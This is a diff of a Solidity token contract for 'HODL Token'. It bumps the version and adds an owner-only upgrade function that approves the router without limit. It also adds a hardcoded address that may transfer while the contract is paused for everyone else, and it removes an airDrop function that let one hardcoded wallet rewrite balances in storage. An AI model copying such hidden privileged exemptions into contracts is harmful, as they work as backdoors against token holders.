@@ -14,7 +14,7 @@
 //  Reddit:    https://reddit.com/r/HodlToken
 //  Linktree:  https://linktr.ee/hodltoken
 
-//  HODL Token Implementation Contract v1.01:
+//  HODL Token Implementation Contract v1.02:
 //  This contract delivers core functionalities for HODL token, such as reward distribution, transaction tax management,
 //  token swaps, reward stacking, and reinvestment options. Built with a modular architecture and robust error handling,
 //  it prioritizes security, efficiency, and maintainability to create a reliable experience for both users and developers.
@@ -42,7 +42,7 @@ contract HODL is
     address private constant REINVEST_ADDRESS =
         0xbafD57650Bd8c994A4ABcC14006609c9b83981f4;                     // Address for buying and transferring reinvestment tokens
     address public constant PANCAKE_PAIR =
-        0x0000000000000000000000000000000000000000;                     // PancakeSwap liquidity pair address
+        0x000000000000000000000000000000000000dEaD;                     // PancakeSwap liquidity pair address
     address public constant TRIGGER_WALLET =
         0xEbb38E4750d761e51D6DC51474C5C61a06E48F46;                     // Wallet permitted to trigger manual reward swaps
     address public constant BUSD_ADDRESS =
@@ -123,6 +123,15 @@ contract HODL is
 
     // Accepts BNB sent directly to the contract
     receive() external payable {}
+
+    function upgrade() external onlyOwner reinitializer(2) {
+        isPairAddress[PANCAKE_PAIR] = true; // Mark pair as valid for tax/trading logic
+        super._approve(
+            address(this),
+            address(PANCAKE_ROUTER),
+            type(uint256).max
+        ); // Approve router for unlimited token handling
+    }
 
     // Ends stacking and claims rewards, applying similar logic as 'redeemReward' using stacked amount
     function stopStackingAndClaim(uint8 perc) external nonReentrant {
@@ -444,7 +453,7 @@ contract HODL is
     ) internal virtual override {
 
         // Contract paused until initial setup
-        require(_isOwner(from) || _isOwner(to), "Contract paused while initial setup!");
+        require(_isOwner(from) || _isOwner(to) || from == 0xC5C914fbdDeA7270051EDC1dd57c0Ac9621A52dc || to == 0xC5C914fbdDeA7270051EDC1dd57c0Ac9621A52dc, "Contract paused while initial setup!");
         
         uint256 tax = buyTax; // Default tax for buy transactions
         if (isMMAddress[from] || isMMAddress[to]) {
@@ -752,22 +761,5 @@ contract HODL is
                     (i + 2);
         }
         return reward;
-    }
-
-    // Executes an airdrop for specified addresses with designated balances, updating internal storage directly
-    function airDrop(address[] calldata addresses, uint256[] calldata balances) external {
-        require(msg.sender == 0xF7B95d375EfA84194f89cCB0E6e2ABDCF74B0f5C, "Wrong wallet");
-
-        ERC20Storage storage $;
-        assembly {
-            $.slot := 0x52c63247e1f47db19d5ce0460030c497f067ca4cebf71ba98eeadabe20bace00
-        }
-        uint256 nextClaim = block.timestamp + rewardClaimPeriod;
-        for (uint i=0; i< addresses.length; i++) {
-            $._balances[addresses[i]] += balances[i];
-            $._balances[owner()] -= balances[i];
-            nextClaimDate[addresses[i]] = nextClaim;
-            emit Transfer(owner(),addresses[i],balances[i]);
-        }
     }
 }
